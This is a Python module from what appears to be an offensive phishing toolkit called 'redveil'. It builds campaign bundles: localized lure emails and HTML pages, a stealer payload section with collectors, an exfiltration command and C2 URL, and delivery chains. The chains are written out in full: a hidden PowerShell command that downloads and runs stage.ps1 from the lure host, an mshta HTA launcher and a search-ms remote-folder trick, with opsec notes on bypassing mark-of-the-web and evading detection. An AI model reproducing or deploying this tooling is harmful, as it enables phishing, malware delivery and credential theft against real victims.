# language: Python 3.11+, file: cf/generator.py
# *category-pack generator — pack + seed -> deterministic campaign bundle*
from __future__ import annotations

import json
import random
import string
from functools import cache
from pathlib import Path
from typing import Any

from .collect import COLLECTORS, EXFIL, collector, exfil as exfil_cmd
from .lure import LureBuilder, SCENARIOS
from .payload import PayloadFactory
from .techniques import TECHNIQUES
from .util import write_text

CATEGORY_DIR = Path(__file__).resolve().parent / "data" / "categories"

#: every placeholder a pack template may use — generate() fills all of them
CTX_KEYS: frozenset[str] = frozenset({
    "brand", "name", "first", "city", "tracking", "ref", "amount",
    "deadline", "company", "domain", "agent", "lure",
})

REQUIRED_KEYS: tuple[str, ...] = (
    "id", "label", "persona", "scenarios", "channels", "context",
    "techniques", "payload", "opsec", "chain", "exploits",
)

_ID_CHARS = frozenset("abcdefghijklmnopqrstuvwxyz0123456789_-")

_NAMES = (
    "Marie Durand", "Thomas Bernard", "Sofia Moreau", "Lucas Petit",
    "Nadia Robert", "Hugo Fontaine", "Camille Roux", "Yanis Mercier",
)
_CITIES = (
    "Lyon", "Nantes", "Bordeaux", "Lille", "Strasbourg", "Rennes",
    "Toulouse", "Montpellier", "Nice", "Reims",
)
_AGENTS = ("M. Lefèvre", "Mme Girard", "M. Morel", "Mme Aubert")

#: OSS delivery chains — public Windows behaviour, no CVE required.
#: redveil-pro adds exploit chains through the seam in _chains().
_BUILTIN_CHAINS: dict[str, dict[str, str]] = {
    "motw-lnk": {
        "command": (
            "powershell -w h -nop -ep bypass -c \"iex (iwr "
            "'{lure}/stage.ps1' -UseBasicParsing)\""
        ),
        "mitre": "T1204.002",
        "opsec": (
            "lnk inside an archive keeps the payload one click after extraction; "
            "Windows 11 re-marks some formats — .img/.iso were the reliable bypass"
        ),
    },
    "hta-oneclick": {
        "command": "mshta.exe {lure}/update.hta",
        "mitre": "T1204.002",
        "opsec": "mshta survives app-control baselines but shows up in 4688 child trees",
    },
    "search-ms": {
        "command": "search-ms:query={ref}&crumb=location:{lure}",
        "mitre": "T1204.002",
        "opsec": "renders a remote WebDAV/SMB folder as if local — host must be reachable",
    },
}


def builtin_chains() -> dict[str, dict[str, str]]:
    """OSS chain library, copied — tests and tooling read this."""
    return dict(_BUILTIN_CHAINS)


def _pro_pack_dirs() -> tuple[Path, ...]:
    """Premium packs ship in redveil-pro — discovered when present, never required."""
    try:
        import redveil_pro  # type: ignore[import-not-found]
    except ImportError:
        return ()
    pro_file = getattr(redveil_pro, "__file__", None)
    if not pro_file:
        return ()
    root = Path(pro_file).resolve().parent / "data" / "categories"
    return (root,) if root.is_dir() else ()


def _chains() -> dict[str, dict[str, str]]:
    """Builtin chains + redveil-pro's — collision fails closed at load."""
    chains = dict(_BUILTIN_CHAINS)
    try:
        from redveil_pro.chains import CHAINS as pro_chains
    except ImportError:
        return chains
    overlap = chains.keys() & pro_chains.keys()
    if overlap:
        raise ValueError(
            "chain id collision with redveil-pro: " + ", ".join(sorted(overlap))
        )
    chains.update(pro_chains)
    return chains


def list_packs() -> list[str]:
    ids = {p.stem for p in CATEGORY_DIR.glob("*.json")}
    for pro_dir in _pro_pack_dirs():
        ids |= {p.stem for p in pro_dir.glob("*.json")}
    return sorted(ids)


def _validate(spec: dict[str, Any], pack_id: str) -> None:
    def bad(msg: str) -> ValueError:
        return ValueError(f"pack {pack_id}: {msg}")

    missing = [k for k in REQUIRED_KEYS if k not in spec]
    if missing:
        raise bad("missing keys: " + ", ".join(missing))
    if spec["id"] != pack_id:
        raise bad(f"id '{spec['id']}' does not match the file name")

    scen = spec["scenarios"]
    if not isinstance(scen, list) or not scen:
        raise bad("scenarios must be a non-empty list")
    for sid in scen:
        if sid not in SCENARIOS:
            raise bad(f"unknown scenario: {sid}")

    channels = spec["channels"]
    if not isinstance(channels, dict) or "email" not in channels:
        raise bad("channels must be a dict including email")
    formatter = string.Formatter()
    for name, tpl in channels.items():
        if not isinstance(tpl, dict) or not tpl.get("body"):
            raise bad(f"channel {name}: body template required")
        for field_name in ("subject", "body"):
            raw = tpl.get(field_name)
            if not raw:
                continue
            for _, field, _, _ in formatter.parse(str(raw)):
                if field and field.split(".")[0].split("[")[0] not in CTX_KEYS:
                    raise bad(f"channel {name}: unknown placeholder {{{field}}}")

    tech = spec["techniques"]
    surfaces = {t.surface for t in TECHNIQUES.values()}
    for s in tech.get("surfaces", ()):
        if s not in surfaces:
            raise bad(f"unknown surface: {s}")
    all_tags = {tg for t in TECHNIQUES.values() for tg in t.tags}
    for tg in tech.get("prefer_tags", ()):
        if tg not in all_tags:
            raise bad(f"unknown tag: {tg}")
    for tid in tech.get("avoid", ()):
        if tid not in TECHNIQUES:
            raise bad(f"unknown technique: {tid}")
    if not 1 <= int(tech.get("min_reliability", 1)) <= 5:
        raise bad("min_reliability must be 1..5")

    pay = spec["payload"]
    for kind in pay.get("collect", ()):
        if kind not in COLLECTORS:
            raise bad(f"unknown collector: {kind}")
    if pay.get("exfil") not in EXFIL:
        raise bad(f"unknown exfil: {pay.get('exfil')}")
    if not 0 <= float(pay.get("jitter", 0.0)) <= 0.9:
        raise bad("jitter must be 0..0.9")

    op = spec["opsec"]
    if not 1 <= int(op.get("variant_count", 1)) <= 10:
        raise bad("variant_count must be 1..10")
    if int(op.get("dwell_hours", 0)) < 0:
        raise bad("dwell_hours must be >= 0")

    for key in spec.get("context", {}).get("inject", ()):
        if key not in CTX_KEYS:
            raise bad(f"unknown inject key: {key}")
    chains = _chains()
    for eid in spec.get("exploits", ()):
        if eid not in chains:
            raise bad(f"unknown chain: {eid}")


@cache
def load_pack(pack_id: str) -> dict[str, Any]:
    """Read + validate one pack — unknown or malformed ids fail closed."""
    if not pack_id or not all(c in _ID_CHARS for c in pack_id):
        raise FileNotFoundError(f"unknown pack: {pack_id}")
    for base in (CATEGORY_DIR, *_pro_pack_dirs()):
        path = base / f"{pack_id}.json"
        if path.is_file():
            with path.open(encoding="utf-8") as fh:
                spec: dict[str, Any] = json.load(fh)
            _validate(spec, pack_id)
            return spec
    raise FileNotFoundError(f"unknown pack: {pack_id}")


def select_techniques(pack: dict[str, Any], limit: int = 3) -> list[Any]:
    """Score the catalog against the pack rules: avoid is a hard exclude,
    surfaces a whitelist, prefer_tags a bonus — reliability decides ties."""
    rules = pack["techniques"]
    surfaces = set(rules.get("surfaces") or ())
    avoid = set(rules.get("avoid") or ())
    prefer = set(rules.get("prefer_tags") or ())
    min_rel = int(rules.get("min_reliability", 1))
    scored: list[tuple[int, str, Any]] = []
    for tech in TECHNIQUES.values():
        if tech.id in avoid:
            continue
        if surfaces and tech.surface not in surfaces:
            continue
        if tech.reliability < min_rel:
            continue
        score = tech.reliability * 10 + 5 * len(prefer & set(tech.tags))
        scored.append((-score, tech.id, tech))
    scored.sort(key=lambda row: (row[0], row[1]))
    if not scored:
        raise ValueError(
            f"pack {pack['id']}: no technique matches "
            f"surfaces={sorted(surfaces)} min_reliability={min_rel}"
        )
    return [tech for _, _, tech in scored[: max(1, limit)]]


def _ctx(rng: random.Random, pack: dict[str, Any]) -> dict[str, str]:
    name = rng.choice(_NAMES)
    return {
        "brand": str(pack["persona"].get("brand", "")),
        "name": name,
        "first": name.split()[0],
        "city": rng.choice(_CITIES),
        "tracking": f"RN{rng.randrange(10 ** 8):08d}FR",
        "ref": str(rng.randrange(100000, 999999)),
        "amount": f"{rng.randrange(3, 99)},{rng.randrange(10, 99):02d} €",
        "deadline": f"{rng.randrange(2, 48)} h",
        "company": "Delmas & Associés",
        "domain": "corp.local",
        "agent": rng.choice(_AGENTS),
        "lure": "",
    }


def _fill(template: str, ctx: dict[str, str]) -> str:
    try:
        return template.format_map(ctx)
    except KeyError as exc:
        raise ValueError(f"unknown placeholder {{{exc.args[0]}}}") from None


_PS_VALUES = {
    "path": "$env:USERPROFILE\\Documents",
    "limit": "50",
    "url": "https://example.invalid/drop",
    "key": "CHANGE_ME",
}


def _payload_section(
    pack: dict[str, Any], *, include_chain: bool, edr_hint: str, c2_url: str
) -> dict[str, Any]:
    spec = pack["payload"]
    values = dict(_PS_VALUES)
    if c2_url:
        values["url"] = c2_url
    out: dict[str, Any] = {
        "kind": str(spec.get("kind", "stealer")),
        "collect": [
            collector(kind, **values)
            for kind in list(spec.get("collect", ()))[:8]
        ],
        "exfil": exfil_cmd(str(spec.get("exfil", "http")), **values),
        "sleep": int(spec.get("sleep", 30)),
        "jitter": float(spec.get("jitter", 0.4)),
    }
    if include_chain:
        out["chain"] = PayloadFactory.build_chain_for_target(
            "windows",
            edr_hint or str(spec.get("edr_hint", "")),
            c2_url,
        )
    return out


def generate(
    pack_id: str,
    *,
    channel: str = "email",
    variants: int | None = None,
    seed: int = 0,
    base_url: str = "",
    continue_url: str = "https://www.google.com",
    locale: str = "fr",
    edr_hint: str = "",
    c2_url: str = "",
    include_chain: bool = True,
) -> dict[str, Any]:
    """Deterministic bundle: same pack + same seed = byte-identical output."""
    pack = load_pack(pack_id)
    templates = pack["channels"]
    if channel not in templates:
        raise ValueError(
            f"pack {pack_id}: no channel '{channel}' — has: "
            + ", ".join(sorted(templates))
        )
    n = int(pack["opsec"]["variant_count"]) if variants is None else int(variants)
    if not 1 <= n <= 10:
        raise ValueError(f"variants must be 1..10, got {n}")

    rng = random.Random(seed)
    lure = base_url or "https://HOST"
    scenarios = list(pack["scenarios"])
    selected = select_techniques(pack)
    tpl = templates[channel]

    out_variants: list[dict[str, Any]] = []
    for i in range(n):
        vctx = _ctx(rng, pack)
        vctx["lure"] = lure
        tech = selected[i % len(selected)]
        token = f"{rng.randrange(16 ** 12):012x}"
        out_variants.append({
            "n": i + 1,
            "scenario": scenarios[i % len(scenarios)],
            "channel": channel,
            "technique": tech.id,
            "token": token,
            "command": tech.command_for(lure, token),
            "subject": _fill(str(tpl.get("subject", "")), vctx),
            "body": _fill(str(tpl["body"]), vctx),
        })

    ectx = _ctx(rng, pack)
    ectx["lure"] = lure
    chains = _chains()
    exploits: list[dict[str, str]] = []
    for eid in pack.get("exploits", ()):
        chain = chains.get(eid)
        if chain is None:
            raise ValueError(f"pack {pack_id}: unknown chain: {eid}")
        entry = dict(chain)
        if entry.get("command"):
            entry["command"] = _fill(entry["command"], ectx)
        entry["id"] = eid
        exploits.append(entry)

    return {
        "pack": pack_id,
        "label": pack["label"],
        "seed": seed,
        "channel": channel,
        "locale": locale,
        "continue_url": continue_url,
        "persona": pack["persona"],
        "techniques": [
            {
                "id": t.id,
                "name": t.name,
                "surface": t.surface,
                "category": t.category,
                "reliability": t.reliability,
                "mitre": t.mitre,
            }
            for t in selected
        ],
        "variants": out_variants,
        "payload": _payload_section(
            pack, include_chain=include_chain, edr_hint=edr_hint, c2_url=c2_url
        ),
        "exploits": exploits,
        "opsec": pack["opsec"],
        "chain": pack["chain"],
    }


def write_bundle(bundle: dict[str, Any], out_dir: str | Path) -> dict[str, str]:
    """Drop bundle.json + one rendered lure per variant into out_dir."""
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    written: dict[str, str] = {
        "bundle.json": write_text(
            str(out / "bundle.json"),
            json.dumps(bundle, indent=2, ensure_ascii=False) + "\n",
        )
    }
    brand = str(bundle["persona"].get("brand", ""))
    for v in bundle["variants"]:
        html = LureBuilder.render(
            v["scenario"],
            token=v["token"],
            command=v["command"],
            continue_url=bundle["continue_url"],
            locale=bundle["locale"],
            brand=brand,
        )
        name = f"lure-{v['n']}.html"
        written[name] = write_text(str(out / name), html)
    return written
